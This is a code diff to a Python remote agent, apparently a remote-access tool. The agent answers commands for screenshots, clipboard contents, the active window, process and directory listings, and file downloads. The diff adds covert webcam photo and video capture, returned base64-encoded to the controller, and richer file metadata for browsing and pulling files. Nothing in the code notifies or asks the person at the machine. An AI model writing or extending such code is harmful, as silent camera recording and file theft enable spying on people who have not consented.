@@ -16,6 +16,7 @@ import platform
 import socket
 import struct
 import subprocess
+import tempfile
 import time
 from io import BytesIO
 from pathlib import Path
@@ -31,6 +32,12 @@ try:
     HAS_PSUTIL = True
 except ImportError:
     HAS_PSUTIL = False
+
+try:
+    import cv2
+    HAS_CV2 = True
+except ImportError:
+    HAS_CV2 = False
 
 logging.basicConfig(
     level=logging.INFO,
@@ -164,6 +171,90 @@ def handle_screenshot():
         return {"error": str(e)}
 
 
+def handle_webcam_photo(camera_index=0):
+    if not HAS_CV2:
+        return {"error": "OpenCV non installe (pip install opencv-python)."}
+    cap = cv2.VideoCapture(camera_index)
+    if not cap.isOpened():
+        return {"error": "Webcam indisponible."}
+    try:
+        ok, frame = cap.read()
+        if not ok or frame is None:
+            return {"error": "Impossible de capturer une image webcam."}
+        ok, encoded = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 82])
+        if not ok:
+            return {"error": "Encodage image webcam echoue."}
+        return {
+            "screenshot": base64.b64encode(encoded.tobytes()).decode(),
+            "source": "webcam",
+        }
+    except Exception as e:
+        return {"error": f"Webcam photo: {e}"}
+    finally:
+        cap.release()
+
+
+def handle_webcam_video(duration_sec=6, camera_index=0, fps=10):
+    if not HAS_CV2:
+        return {"error": "OpenCV non installe (pip install opencv-python)."}
+
+    duration_sec = max(2, min(int(duration_sec or 6), 20))
+    fps = max(5, min(int(fps or 10), 20))
+
+    cap = cv2.VideoCapture(camera_index)
+    if not cap.isOpened():
+        return {"error": "Webcam indisponible."}
+
+    width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH) or 640)
+    height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT) or 480)
+    width = max(320, min(width, 1280))
+    height = max(240, min(height, 720))
+
+    target_frames = duration_sec * fps
+    fourcc = cv2.VideoWriter_fourcc(*"mp4v")
+
+    try:
+        with tempfile.NamedTemporaryFile(suffix=".mp4", delete=False) as tmp:
+            tmp_path = tmp.name
+
+        writer = cv2.VideoWriter(tmp_path, fourcc, fps, (width, height))
+        if not writer.isOpened():
+            return {"error": "Impossible de demarrer l'enregistrement video."}
+
+        captured = 0
+        started = time.time()
+        while captured < target_frames:
+            ok, frame = cap.read()
+            if not ok or frame is None:
+                break
+            writer.write(frame)
+            captured += 1
+            elapsed = time.time() - started
+            expected = captured / fps
+            if expected > elapsed:
+                time.sleep(min(expected - elapsed, 0.08))
+
+        writer.release()
+
+        with open(tmp_path, "rb") as f:
+            raw = f.read()
+        os.remove(tmp_path)
+
+        if not raw:
+            return {"error": "Aucune video capturee."}
+
+        return {
+            "filename": f"webcam_{int(time.time())}.mp4",
+            "size": len(raw),
+            "duration_sec": duration_sec,
+            "data": base64.b64encode(raw).decode(),
+        }
+    except Exception as e:
+        return {"error": f"Webcam video: {e}"}
+    finally:
+        cap.release()
+
+
 def handle_processes():
     if IS_WIN:
         out = run_cmd("tasklist /fo csv /nh", timeout=15)
@@ -266,7 +357,23 @@ def handle_listdir(path="."):
         for e in sorted(os.listdir(target)):
             full = os.path.join(target, e)
             is_dir = os.path.isdir(full)
-            entries.append({"name": e, "is_dir": is_dir})
+            size = 0
+            mtime = 0
+            try:
+                st = os.stat(full)
+                size = st.st_size
+                mtime = int(st.st_mtime)
+            except Exception:
+                pass
+            entries.append(
+                {
+                    "name": e,
+                    "is_dir": is_dir,
+                    "path": full,
+                    "size": size,
+                    "mtime": mtime,
+                }
+            )
         return {"entries": entries, "path": target}
     except Exception as e:
         return {"error": str(e), "entries": [], "path": path}
@@ -567,10 +674,12 @@ def handle_cd(path):
 
 def handle_download(filepath):
     try:
-        with open(filepath.strip(), "rb") as f:
+        target = os.path.abspath(filepath.strip())
+        with open(target, "rb") as f:
             data = f.read()
         return {
-            "filename": os.path.basename(filepath),
+            "filename": os.path.basename(target),
+            "path": target,
             "size": len(data),
             "data": base64.b64encode(data).decode(),
         }
@@ -598,6 +707,8 @@ def dispatch(msg):
             "disk_usage":     lambda: handle_disk_usage(),
             "installed_sw":   lambda: handle_installed_sw(),
             "screenshot":     lambda: handle_screenshot(),
+            "webcam_photo":   lambda: handle_webcam_photo(p.get("camera", 0)),
+            "webcam_video":   lambda: handle_webcam_video(p.get("duration", 6), p.get("camera", 0), p.get("fps", 10)),
             "clipboard":      lambda: handle_clipboard(),
             "active_window":  lambda: handle_active_window(),
             "listdir":        lambda: handle_listdir(p.get("path", ".")),
